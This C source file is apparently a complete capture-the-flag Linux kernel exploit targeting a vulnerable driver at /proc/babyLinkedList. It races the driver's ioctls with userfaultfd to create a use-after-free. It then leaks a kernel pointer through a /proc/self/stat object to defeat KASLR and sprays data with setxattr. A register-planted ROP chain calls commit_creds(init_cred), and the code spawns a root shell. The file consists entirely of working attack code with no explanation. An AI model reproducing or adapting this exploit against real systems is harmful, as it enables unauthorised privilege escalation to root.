#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <string.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/sem.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>

#define PAGE_SIZE 0x1000

int fd;
int ret;
sem_t sem_delete;
size_t seq_fd;
size_t seq_fds[0x100];
size_t kernel_offset;
char *user_buf;
char *sleep_buf;

void ErrExit(char* err_msg)
{
	puts(err_msg);
	exit(-1);
}

void get_shell()
{
	if (getuid() == 0)
	{
		puts("\033[32m\033[1m[+] Successful to get the root.\033[0m");
		system("/bin/sh");
	}
	else
	{
		puts("[-] get shell error");
		exit(1);
	}
}

void register_userfault(void *fault_page,void *handler)
{
	pthread_t thr;
	struct uffdio_api ua;
	struct uffdio_register ur;
	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if(ioctl(uffd, UFFDIO_API, &ua) == -1)
		ErrExit("[-] ioctl-UFFDIO_API error");
	
	ur.range.start = (unsigned long)fault_page; // the area we want to monitor
	ur.range.len = PAGE_SIZE;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) // register missing page error handling. when a missing page occurs, the program will block. at this time, we will operate in another thread
		ErrExit("[-] ioctl-UFFDIO_REGISTER error");
	// open a thread, receive the wrong signal, and the handle it
	int s = pthread_create(&thr, NULL, handler, (void*)uffd);
	if(s!=0)
		ErrExit("[-] pthread-create error");
}

typedef struct
{
	uint64_t size;
	char *buf;
}Data;


void add(uint64_t size, char *buf)
{
	Data data;
	data.size = size;
	data.buf = buf;
	ioctl(fd, 0x6666, &data);
}

void delete(char *buf)
{
	Data data;
	data.size = 0;
	data.buf = buf;
	ioctl(fd, 0x7777, &data);
}

void* delete_thread(void* index)
{
	puts("[+] delete thread start");
	sem_wait(&sem_delete);
	delete(sleep_buf);
	return NULL;
}

void *userfault_leak_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;

	puts("\033[34m\033[1m[+] leak handler created\033[0m");
	pthread_t thr_delete;
	pthread_create(&thr_delete, NULL, delete_thread, (void*)0);
	sem_post(&sem_delete);

	sleep(1);
	if ((seq_fd = open("/proc/self/stat", O_RDONLY)) < 0)
		ErrExit("open stat error");

	// init page
	memset(page, 0, sizeof(page));
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] leak handler done");
}

void *userfault_write_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;

	puts("\033[34m\033[1m[+] write handler created\033[0m");

	pthread_t thr_delete;
	pthread_create(&thr_delete, NULL, delete_thread, (void*)1);
	sem_post(&sem_delete);
	
	sleep(1);

	memset(page, 0, sizeof(page));
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] write handler done");
}

void *userfault_sleep_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;

	puts("[+] sleep handler created");
	sleep(100);

	// init page
	memset(page, 0, sizeof(page));
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] sleep handler done");
}

size_t pop_rdi_ret = 0xffffffff81086aa0;
size_t pop_rbp_ret = 0xffffffff810005ae;
size_t init_cred = 0xffffffff82a5fa40;
size_t commit_creds = 0xffffffff810c3d30;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00a44;
size_t add_rsp_ret = 0xffffffff8188fba1;

void *userfault_hijack_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;

	puts("\033[34m\033[1m[+] hijack handler created\033[0m");
	puts("[+] tigger..");

	pop_rdi_ret += kernel_offset;
	pop_rbp_ret += kernel_offset;
	init_cred += kernel_offset;
	commit_creds += kernel_offset;
	swapgs_restore_regs_and_return_to_usermode += kernel_offset;

	__asm__(
	"mov r15,   0x1111111111;"
	"mov r14,   0x2222222222;"
	"mov r13,   0x3333333333;"
	"mov r12,   pop_rdi_ret;"
	"mov rbp,   init_cred;"
	"mov rbx,   pop_rbp_ret;"    
	"mov r11,   0x246;"
	"mov r10,   commit_creds;"
	"mov r9,    swapgs_restore_regs_and_return_to_usermode;"
	"mov r8,    0xaaaaaaaaaa;"
	"xor rax,   rax;"
	"mov rcx,   0xbbbbbbbbbb;"
	"mov rdx,   8;"
	"mov rsi,   rsp;"
	"mov rdi,   seq_fd;"
	"syscall"
	);

	printf("[+] uid: %d gid: %d\n", getuid(), getgid());
	get_shell();
        
	// init page
	memset(page, 0, sizeof(page));
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] hijack handler done");
}

int main()
{
	char *leak_buf;
	char *write_buf;
	char* hijack_buf;
	char leak_data[0x10];
	char write_data[0x10];
	cpu_set_t cpu_set;

	CPU_ZERO(&cpu_set);
	CPU_SET(0, &cpu_set);
	sched_setaffinity(0, sizeof(cpu_set), &cpu_set);

	sem_init(&sem_delete, 0, 0);

	fd = open("/proc/babyLinkedList", O_RDONLY);
	
	//for(int i=0; i<100; i++)
	//	if ((seq_fds[i] = open("/proc/self/stat", O_RDONLY)) < 0)
	//		ErrExit("open stat error");

	leak_buf = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	register_userfault(leak_buf, userfault_leak_handler);
	
	write_buf = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	register_userfault(write_buf, userfault_write_handler);
	
	sleep_buf = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	register_userfault(sleep_buf, userfault_sleep_handler);

	add(0x20, leak_buf);
	delete(leak_data);
	kernel_offset = ((size_t*)leak_data)[0];
	kernel_offset-= 0xffffffff812f2db0;
	printf("\033[33m\033[1m[+] kernel offset: 0x%lx\033[0m\n", kernel_offset);

	add(0x20, write_buf);

	hijack_buf = (char*)mmap(NULL, 2*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	register_userfault(hijack_buf+PAGE_SIZE, userfault_hijack_handler);
	*(size_t*)(hijack_buf + PAGE_SIZE - 8) = 0xffffffff8188fba1 + kernel_offset;

	setxattr("/exp", "FXC", hijack_buf + PAGE_SIZE - 8, 32, 0);
	return 0;
}
